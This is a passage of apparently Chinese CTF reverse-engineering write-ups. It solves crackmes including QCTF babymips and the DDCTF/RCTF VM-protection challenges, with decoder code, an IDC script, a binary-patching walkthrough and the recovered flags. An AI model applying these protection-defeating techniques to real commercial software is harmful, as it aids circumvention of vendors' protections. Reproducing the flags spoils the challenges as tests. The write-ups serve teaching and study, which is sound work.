base64.b64decode(s)</span><br></pre></td></tr></table></figure><p>运行得到结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;wh0_1s_&#123;0ur_d4ldy&#125;</span><br></pre></td></tr></table></figure><h3 id="QCTF2018-Xman-babymips"><a href="#QCTF2018-Xman-babymips" class="headerlink" title="QCTF2018 Xman_babymips"></a>QCTF2018 Xman_babymips</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* arr = <span class="string">"Q|j&#123;g"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> arr2[] = &#123; <span class="number">0x52</span>,<span class="number">0xFD</span>,<span class="number">0x16</span>,<span class="number">0xA4</span>,<span class="number">0x89</span>,<span class="number">0xBD</span>,<span class="number">0x92</span>,<span class="number">0x80</span>,<span class="number">0x13</span>,<span class="number">0x41</span>,<span class="number">0x54</span>,<span class="number">0xA0</span>,<span class="number">0x8D</span>,<span class="number">0x45</span>,<span class="number">0x18</span>,<span class="number">0x81</span>,<span class="number">0xDE</span>,<span class="number">0xFC</span>,<span class="number">0x95</span>,<span class="number">0xF0</span>,<span class="number">0x16</span>,<span class="number">0x79</span>,<span class="number">0x1A</span>,<span class="number">0x15</span>,<span class="number">0x5B</span>,<span class="number">0x75</span>,<span class="number">0x1F</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, arr[i]^(<span class="number">32</span>-i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> temp = i + <span class="number">5</span>;</span><br><span class="line"><span class="keyword">if</span> (temp % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> t = arr2[i] % <span class="number">4</span>;</span><br><span class="line">arr2[i] = arr2[i] / <span class="number">4</span>;</span><br><span class="line">arr2[i] = arr2[i] +t*<span class="number">64</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, arr2[i] ^(<span class="number">32</span>-temp));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> t = arr2[i] /<span class="number">64</span>;</span><br><span class="line">arr2[i] = arr2[i] %<span class="number">64</span>;</span><br><span class="line">arr2[i] = arr2[i]*<span class="number">4</span> + t;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, arr2[i] ^ (<span class="number">32</span> - temp));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qctf&#123;ReA11y_4_B@89_mlp5_4_XmAn_&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Binary security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>VM保护合集</title>
      <link href="/VM%E4%BF%9D%E6%8A%A4%E5%90%88%E9%9B%86/"/>
      <url>/VM%E4%BF%9D%E6%8A%A4%E5%90%88%E9%9B%86/</url>
      <content type="html"><![CDATA[<h1 id="VM保护合集"><a href="#VM保护合集" class="headerlink" title="VM保护合集"></a>VM保护合集</h1><p>题目清单</p><ul><li style="list-style: none"><input type="checkbox" checked> DDCTF2018 黑盒破解</li><li style="list-style: none"><input type="checkbox" checked> RCTF2018 Simple vm</li><li style="list-style: none"><input type="checkbox" checked> RCTF2018 Magic</li></ul><a id="more"></a><h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>虚拟机保护技术是指，将程序代码转换为自定义的中间操作码（OpCode，当操作码只占一个字节可称作ByteCode），OpCode通过一种解释执行系统或者模拟器（Emulator）解释执行，实现代码基本功能。</p><p>逆向这种程序，一般需要对emulator结构进行逆向，结合opcode进行分析，得到各个操作码对应的基本操作，从而理解程序功能。（图片来自：<a href="https://mp.weixin.qq.com/s/4Nfso1OuHeQgCTGYv2IF5Q）" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/4Nfso1OuHeQgCTGYv2IF5Q）</a></p><img src="/VM保护合集/1530847718783.png" title="pre_1"><h3 id="JVM虚拟机"><a href="#JVM虚拟机" class="headerlink" title="JVM虚拟机"></a>JVM虚拟机</h3><p>JVM虚拟可以提供一种与平台无关的编程环境，这是虚拟化思想的一种成功应用。下图为JVM虚拟机的基本架构（图片来自：geeksforgeeks ）</p><img src="/VM保护合集/1530848472213.png" title="pre_2"><h3 id="VMP虚拟机"><a href="#VMP虚拟机" class="headerlink" title="VMP虚拟机"></a>VMP虚拟机</h3><p>VMP虚拟机保护技术指的是将基于x86汇编系统的可执行代码转换为字节码指令系统的代码，达到保护原有指令不被轻易逆向和修改的目的。从本质上来说，就是创建一套虚拟指令系统对原本的x86汇编指令系统进行一次封装，将原本的汇编指令转换为另一种表现形式。</p><p>虚拟指令有自己的机器码，但和原本的x86汇编机器码完全不一样，而且常常是一堆无意义的代码，他们只能由VM虚拟解释器（Dispatcher）来解释并执行。我们在逆向时看到的汇编代码其实不是x86汇编代码，而是字节码（伪指令），它是由指令执行系统定义的一套指令和数据组成的一串数据流，所以虚拟机的脱壳很难写出一个通用的脱壳机，原则上只要虚拟指令集一变动，原本的伪指令的解释就会发生变化。</p><blockquote><p>要逆向被VM SDK保护起来的原始代码，只有手工分析这段虚拟指令，找到虚拟指令和原始汇编的对应关系，然后重写出原始程序的代码，完成算法的逆向和分析。</p></blockquote><blockquote><p>详情待施工……</p></blockquote><h2 id="题目示例"><a href="#题目示例" class="headerlink" title="题目示例"></a>题目示例</h2><h3 id="DDCTF2018-黑盒破解"><a href="#DDCTF2018-黑盒破解" class="headerlink" title="DDCTF2018 黑盒破解"></a>DDCTF2018 黑盒破解</h3><p>解题的基本思路是通过分析二进制文件，得到opcode及其对应的基本操作，通过构造passcode，令程序输出binggo字样。</p><h5 id="前期准备分析"><a href="#前期准备分析" class="headerlink" title="前期准备分析"></a>前期准备分析</h5><p>拿到文件完成基本分析后加载到IDA。</p><pre><code>首先通过字符串搜索，并交叉引用定位到主函数，分析程序的基本逻辑：输入password（即给的txt文件名中的数字），然后输入passcode，令程序输出Binggo。main函数关键判断如下</code></pre>  <img src="/VM保护合集/1530849338318.png" title="ReverseMe_1"><pre><code>对flag查找引用发现一个函数，但继续查找引用遇到障碍，所以开动态调试，看一下程序运行的情况。发现sub_401A48可能是一个重要函数，进入查看。</code></pre>  <img src="/VM保护合集/1530858822184.png" title="ReverseMe_2"><pre><code>这段代码F5之后不是很友好，但还是看得到大概意思是：根据输入参数调用函数，也就是虚拟机的Dispatcher位置，被调用的各个函数就是虚拟机的各个Handler。下图的汇编更加直接的展示了这个意思，call eax表示调用Handler。</code></pre>  <img src="/VM保护合集/1530860300945.png" title="ReverseMe_3"><p>#####得到passcode与其对应的操作</p><p>在这段调用Handel的CFG块上方是判断是否会执行调用的关键代码。根据汇编代码推断算法，并写出idc脚本。在推断算法时要注意根据动态调试来确定各个值得变化，不然很容易出错。</p>  <img src="/VM保护合集/1530858999174.png" title="ReverseMe_4"><pre><code>idc脚本如下，要注意这个脚本中的值0x123E010在每一次执行过程中会发生变化，因为它是输入参数存放的地址，具体方法是动态调试执行到参数存放时得到地址值，再根据它修改脚本。爆破出各种可能的函数跳转。</code></pre>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> i,j,p,q,v14;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">p = Byte(<span class="number">0x123E010</span>+<span class="number">4</span>*(i+<span class="number">72</span>)+<span class="number">8</span>);</span><br><span class="line">v14 = Dword(<span class="number">0x123E010</span>+<span class="number">8</span>*(p+<span class="number">0x54</span>)+<span class="number">8</span>);</span><br><span class="line">Message(<span class="string">"%x"</span>,p);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span> ;j&lt;<span class="number">255</span>;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(Byte(<span class="number">0x603900</span>+j)==Byte(<span class="number">0x123E010</span>+p+<span class="number">0x198</span>))&#123;</span><br><span class="line">q = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">Message(<span class="string">"%x %c %x\n"</span>,q , q, v14);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>运行结果如下</code></pre><hr><p>  1324 $ 400dc1<br>  9738 8 400e7a<br>  1943 C 400f3a<br>  774 t 401064<br>  c730 0 4011c9<br>  d545 E 40133d<br>  c875 u 4012f3<br>  1423 # 4014b9</p><hr><pre><code>现在要开始分析各个handler的作用，最为特殊的一个handler是sub_40133d，进入这个函数后发现代码如下：</code></pre>  <img src="/VM保护合集/1530862044942.png" title="ReverseMe_5"><pre><code>这段代码有个地方比较坑，其实这个将flag置1并不是问题的关键，这个题目要求的是输出“Binggo”字样，所以这里的三个函数并不要去逆向分析，关键在于前面几句，将a1+0x120里的20个字节输出，我们要做的就是构造输出的字符串。在构造之前我们先要分析出其他handler的作用才能根据这些handler构造字符串。各个handler的分析过程比较痛苦，但在分析时要有一个意识，虚拟机的堆栈或寄存器是创建在真实堆栈之上的，比如说在这个题目中有很多类似如下的代码。</code></pre>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [rax+120h]</span><br></pre></td></tr></table></figure><pre><code>其实这当中的[rax+120h]只是模拟一个变量或者一个寄存器，在整个handler中一共用到了四个变量，下面是四个变量的枚举，以及经过分析得出的四变量的作用。</code></pre><hr><p>  [rax+120h] –&gt; 当前指针位置a[index]</p><p>  [rax+298h] –&gt; 当前字符参数的下一个字符passcode[next]</p><p>  [rax+299h] –&gt; 临时变量temp</p><hr><pre><code>最终得到下表</code></pre><table><thead><tr><th style="text-align:center">opcode</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">$</td><td style="text-align:center">temp = a[index]</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center">a[index] = temp</td></tr><tr><td style="text-align:center">C</td><td style="text-align:center">temp += passcode[next] -33</td></tr><tr><td style="text-align:center">t</td><td style="text-align:center">temp -= passcode[next] +33</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">index++</td></tr><tr><td style="text-align:center">E</td><td style="text-align:center">if(passcode[next]==’s’) print(a)</td></tr><tr><td style="text-align:center">u</td><td style="text-align:center">index–</td></tr><tr><td style="text-align:center">#</td><td style="text-align:center">temp = passcode[temp+passcode[next]-48]-49</td></tr></tbody></table><p>#####构造passcode</p><p>根据上表构造passcode，这里要注意，由于每次取到的a[index]无法静态分析获得，只能每构造一个字符，再动态调试获得下一个a[index]。最后要注意由于输出handler是输出20个字符，而Binggo只有六个字符，所以要注意构造第七个字符加上’\x00’使其截断。构造方式有很多种，下面是一种从前向后的构造方法。</p><hr><p>  $ –&gt; 取得a[index]的值为50h</p><p>  t/ –&gt; 将50h变为’B’</p><p>  8 –&gt; 将’B’放回到a[index]</p><p>  0 –&gt; index++</p><hr><pre><code>重复上述操作得到&quot;Binggo&quot;字符串，对应的passcode为&apos;$t/80$C)80$CI80$CX80$Cg80$Cj80 &apos;，然后再通过&apos;#J1&apos;构造&apos;\x00&apos;最后将index移回字符串开头并输出对应passcode为&apos;uuuuuuuEs &apos;。 </code></pre><p>passcode:</p><p>$t/80$C)80$CI80$CX80$Cg80$Cj80#J1uuuuuuuEs</p><h3 id="RCTF2018-Simple-vm"><a href="#RCTF2018-Simple-vm" class="headerlink" title="RCTF2018 Simple vm"></a>RCTF2018 Simple vm</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>这道题目给出了Emulator和虚拟机的opcode，通过逆向分析Emulator中各个handler的作用以及opcode的意义推断正确输入从而得到flag</p><p>#####分析</p><p>​    运行vm_rel看一下程序要求，发现是要猜输入</p>  <img src="/VM保护合集/1531100314558.png" title="Simplevm_1"><pre><code>把vm_rel拖入IDA里面进行字符串搜索，并未发现“Input Flag”等字符串。进入主函数看代码流程，猜测vm_rel其实是虚拟机emulator，p.bin才是真正的函数。</code></pre>  <img src="/VM保护合集/1531100479109.png" title="Simplevm_2"><pre><code>把p.bin拖到hexwin里面，发现字符串“Input Flag”、“Wrong”、“Right”，证实上述猜测。</code></pre>  <img src="/VM保护合集/1531099589829.png" title="Simplevm_3"><h5 id="动态调试对p-bin的行为进行分析"><a href="#动态调试对p-bin的行为进行分析" class="headerlink" title="动态调试对p.bin的行为进行分析"></a>动态调试对p.bin的行为进行分析</h5><p>注意输出”Input Flag“和接受输入部分的代码可以直接在Pseudocode窗口调试，分别将断点下在putchar()和getchar()处，通过观察寄存器edx的值来推测循环次数。但是在调试输入字符串处理和判断结果并输出部分，最好在汇编窗口调试，观察值的变化，便于找到比较字符串。</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//输出“Input Flag”部分的代码</span></span><br><span class="line">next = *(_DWORD *)&amp;pcode[next];</span><br><span class="line">v18 = next;</span><br><span class="line">next += <span class="number">4</span>;</span><br><span class="line">v10 = *(_DWORD *)&amp;pcode[v18];</span><br><span class="line">dword_6010A4 = v10;</span><br><span class="line"><span class="comment">//循环11次</span></span><br><span class="line">++dword_6010A4;</span><br><span class="line">v6 = dword_6010A4;</span><br><span class="line">v14 = (<span class="keyword">char</span>)pcode[v6];</span><br><span class="line">c = v14;</span><br><span class="line"><span class="built_in">putchar</span>(c);</span><br><span class="line">v15 = &amp;pcode[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;pcode[next]];</span><br><span class="line">    <span class="keyword">if</span> ( *v15 )&#123;</span><br><span class="line">    next = *(_DWORD *)&amp;pcode[next + <span class="number">4</span>];</span><br><span class="line">        --*v15;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        next += <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">v18 = next;</span><br><span class="line">next += <span class="number">4</span>;</span><br><span class="line">v10 = *(_DWORD *)&amp;pcode[v18];</span><br><span class="line">dword_6010A4 = v10;</span><br><span class="line"><span class="comment">//接受输入部分的代码，输入字符串长度为0x1F</span></span><br><span class="line"><span class="comment">//接受的字符串存储在\xF81362的地址里(地址每次调试不同)，统一称为*input</span></span><br><span class="line">++dword_6010A4;</span><br><span class="line">    v14 = getchar();</span><br><span class="line">c = v14;</span><br><span class="line">v8 = dword_6010A4;</span><br><span class="line">v12 = c;</span><br><span class="line">pcode[v8] = v12;</span><br><span class="line">v15 = &amp;pcode[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;pcode[next]];</span><br><span class="line"><span class="keyword">if</span> ( *v15 )&#123;</span><br><span class="line">    next = *(_DWORD *)&amp;pcode[next + <span class="number">4</span>];</span><br><span class="line">        --*v15;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        next += <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//处理输入;处理后的字符串统一称为*output</span></span><br><span class="line">temp1 = ~(input[i]&amp;(<span class="number">32</span>+i));</span><br><span class="line">temp2 = ~(temp1&amp;input[i]);</span><br><span class="line">temp3 = ~(temp1&amp;(<span class="number">32</span>+i));</span><br><span class="line">output = ~(temp2&amp;temp3);</span><br><span class="line"><span class="comment">//上述四条命令相当于xor(input[i]&amp;(32+i))</span></span><br><span class="line"><span class="comment">//判断结果并输出</span></span><br><span class="line">cmp(output,<span class="number">0x1018431415474017101D4B121F49481853540157515305565A08585F0A0C5809</span>)</span><br></pre></td></tr></table></figure><h5 id="求解"><a href="#求解" class="headerlink" title="求解"></a>求解</h5><p>​    理清楚上述逻辑之后就编写程序求解。</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> str[] = &#123;<span class="number">0x10</span>,<span class="number">0x18</span>,<span class="number">0x43</span>,<span class="number">0x14</span>,<span class="number">0x15</span>,<span class="number">0x47</span>,<span class="number">0x40</span>,<span class="number">0x17</span>,<span class="number">0x10</span>,<span class="number">0x1D</span>,<span class="number">0x4B</span>,<span class="number">0x12</span>,<span class="number">0x1F</span>,<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x18</span>,<span class="number">0x53</span>,<span class="number">0x54</span>,<span class="number">0x01</span>,<span class="number">0x57</span>,<span class="number">0x51</span>,<span class="number">0x53</span>,<span class="number">0x05</span>,<span class="number">0x56</span>,<span class="number">0x5A</span>,<span class="number">0x08</span>,<span class="number">0x58</span>,<span class="number">0x5F</span>,<span class="number">0x0A</span>,<span class="number">0x0C</span>,<span class="number">0x58</span>,<span class="number">0x09</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>,str[i]^(<span class="number">32</span>+i))</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  09a71bf084a93df7ce3def3ab1bd61f6</p>  <img src="/VM保护合集/1531134057128.png" title="Simplevm_4"><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>直接用angr解</p><blockquote><p>待施工…… </p></blockquote><h3 id="RCTF2018-Magic"><a href="#RCTF2018-Magic" class="headerlink" title="RCTF2018 Magic"></a>RCTF2018 Magic</h3><p>​    这道题涉及到寻找程序入口、打补丁、vm保护、rc4等知识点，基本思路是首先找到程序入口，发现存在一个时间验证和一个输入字符串验证，时间验证的算法十分复杂，可以直接逆也可以调用源程序算法爆破，爆破出时间之后，给程序打好补丁继续调试发现还有一个输入验证，这个输入验证首先对输入进行rc4编码，然后用vm进行加密，最后进行对比，在破解时，先破解虚拟机emulator，然后根据它的opcode推断出vm保护代码，得到rc4加密后的字符串，最后利用rc4加解密算法一致的方式，直接利用源程序得到解密就可以得到部分flag，将着部分flag输入patch过的程序得到另一半flag。</p><p>#####寻找入口函数</p><p>​    运行程序发现如下信息</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\CTF\tmp\VM&gt;magic.exe</span><br><span class="line">flag only appears at a specific time, range [2018-05-19 09:00, 2018-05-21 09:00)</span><br><span class="line">Better luck next time :)</span><br></pre></td></tr></table></figure><pre><code>拖入IDA中，查找字符串，返现与上述输出相关的信息，但是交叉引用跳转到的main函数并无相关输出。在main函数上下断点，动态调试发现在执行main函数之前已经输出，所以判断这个main函数并不是真正的程序入口。交叉引用找到调用main的函数sub_4011B0，在sub_4011B0开始设一个断点，在main函数开始设一个断点，然后利用IDA函数跟踪功能找到这两个断点之间调用puts函数的的函数sub_402218。往上看可以看到函数sub_402357调用了sub_402218，再往上没有找到sub_402357的调用信息。初步判定这里就是入口函数。</code></pre>  <img src="/VM保护合集/1531196876332.png" title="magic_1"><p>#####时间验证</p><p>​    打开sub_402357发现如下关键判断：</p>  <img src="/VM保护合集/1531202474620.png" title="magic_2"><pre><code>对dword_4099D0[0]交叉引用找到如下函数，将其命名为check_time。要想执行main函数必须使得dword_402357的值为1，进入check_time函数，发现代码逻辑为：首先返回在（0x5B028A8F, 0x5AFFE78F]之间的的时间戳，以时间戳为种子取随机数对Table表做异或运算，再通过sub_4027ED对Table表进行变化，并返回v4和v3。如果想达到前文阐述的目的，只有让v4 == 0x7000 &amp; v3 == 0条件成立。</code></pre>  <img src="/VM保护合集/1531212840131.png" title="magic_3"><pre><code>进入sub_4027E0函数发现反编译代码十分奇怪，可以选择直接看汇编，但我在https://www.52pojie.cn/thread-742361-1-1.html这篇文章中，发现了一种调用原程序的方法，暴力求解time的方法。这个方法十分巧妙的借用源程序中的算法和数据，得到满足条件的time，程序如下：</code></pre><blockquote><p>下面代码还存在问题，待施工……</p></blockquote>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="title">int</span><span class="params">(*test)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">static</span> UINT time = <span class="number">0x5AFFE78F</span> + <span class="number">1</span>;</span><br><span class="line"><span class="function">UINT <span class="title">myfun</span><span class="params">(<span class="keyword">int</span>)</span> </span>&#123; <span class="comment">//通过这种形式遍历每一个time</span></span><br><span class="line">        <span class="keyword">return</span> time++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> e1_copy[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        UINT64 * ptr1 = (UINT64 *)<span class="number">0x40A38C</span>;<span class="comment">//time64</span></span><br><span class="line">        UINT64 * ptr2 = (UINT64 *)<span class="number">0x40A414</span>; <span class="comment">//srand</span></span><br><span class="line">        UINT64 * ptr3 = (UINT64 *)<span class="number">0x40A3FC</span>;<span class="comment">//rand</span></span><br><span class="line">        UINT64 * ptr4 = (UINT64 *)<span class="number">0x40A3DC</span>;<span class="comment">//memset</span></span><br><span class="line">        HMODULE h = LoadLibraryA(<span class="string">"D:\\magic.exe"</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(e1_copy, (<span class="keyword">void</span> *)<span class="number">0x405020</span>, <span class="number">256</span>); <span class="comment">//备份E1表，重新运算的时候需要还原E1表</span></span><br><span class="line">        test test1 = (test)<span class="number">0x402268</span>;</span><br><span class="line">        *ptr1 = (UINT64)myfun;</span><br><span class="line">        *ptr2 = (UINT64)srand;</span><br><span class="line">        *ptr3 = (UINT64)rand;</span><br><span class="line">        *ptr4 = (UINT64)<span class="built_in">memset</span>;</span><br><span class="line">        UINT val;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)<span class="number">0x405020</span>, e1_copy, <span class="number">256</span>); <span class="comment">// 重置E1表</span></span><br><span class="line">                val =  test1();</span><br><span class="line">                <span class="keyword">if</span> (val != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"time:%x\nkey:%x"</span>, time <span class="number">-1</span> , val); <span class="comment">//0x322ce7a4</span></span><br><span class="line">                        <span class="comment">//time:5b00e398</span></span><br><span class="line">                        <span class="comment">//key: 322ce7a4</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>得到满足条件的time为：0x5b00e398，对程序打个补丁，跳过if时间戳合法判断，将srand的参数修改为我们爆破出来的time，汇编代码修改如下，将补丁应用到原有的二进制文件上的步骤为Edit-&gt;Patch Program/Apply patchs to input file...</code></pre>  <img src="/VM保护合集/1531226529568.png" title="magic_4"><pre><code>给程序打好补丁之后，在这个函数结束的地方打上断点，继续观察程序的运行情况。</code></pre><h5 id="输入验证"><a href="#输入验证" class="headerlink" title="输入验证"></a>输入验证</h5><p>调用check_time的函数sub_402357在执行完成之后回到函数sub_4032A0，经过几次跳转来到函数sub_403180，发现onexit()函数，这个函数的作用是注册一个函数，使得程序在exit()的时候自动调用这个被注册的函数。</p>  <img src="/VM保护合集/1531271826493.png" title="magic_5"><pre><code>执行完这个函数之后，程序终于开始执行main函数，main函数里面没有什么特别重要的内容，两个条件跳转都不会发生，那么肯定是执行了前面onexit()注册的函数，继续F8，跳转到一个有用函数sub_403260，这个函数中的call rax调用了一个关键函数sub_4023B1如下</code></pre>  <img src="/VM保护合集/1531272986405.png" title="magic_6"><pre><code>有些变量名称已经根据其作用有些修改，这个check_rc4其实就是一个简单的rc4加密的过程，它首先生成s盒然后对输入input进行加密，在经过一次rc4后有一个if判断，这个if判断里的函数其实是虚拟机入口，这个虚拟机实现的时候用到了setjmp/longjmp，相关知识在这里：http://www.cs.cmu.edu/afs/cs/academic/class/15213-s02/www/applications/recitation/recitation7/B/r07-B.pdf在利用setjmp/longjmp实现vm保护时，有一个地方特别巧妙，一开始vm_run函数首先将处理过的输入input复制到Count中，然后用signal注册一个函数。</code></pre>  <img src="/VM保护合集/1531283689847.png" title="magic_6"><pre><code>它注册的函数如下</code></pre>  <img src="/VM保护合集/1531298507806.png" title="magic_7"><pre><code>而在各个handler中可以看到如下一个操作</code></pre>  <img src="/VM保护合集/1531298953005.png" title="magic_8"><pre><code>可以看到这里面有除法操作，而除数为0的时候会引起异常，这个时候就会转到signal注册的函数signfunc中去执行操作，执行完之后再返回到循环中去，取下一步操作。其他handler作用的分析比较简单这里不赘述，0x405340处存储的是要执行的opcode，以下是对op凑得的分析</code></pre><hr><pre><code>AB 03 00   reg[3] = 0 AB 04 1A   reg[4] = 0x1AAB 00  66  reg[0] = 0x66AA 05 02   reg[5] = reg[2]    ;input_rc4edA9 53   reg[5] += reg[3]A0 05   reg[5] = *(byte)reg[5]   ;input_rc4ed[i]AB 06 CC   reg[6] = 0xCCA9 56   reg[5] += reg[6] AB 06 FF    reg[6] = 0xFFAC 56   reg[5] &amp;= reg[6] 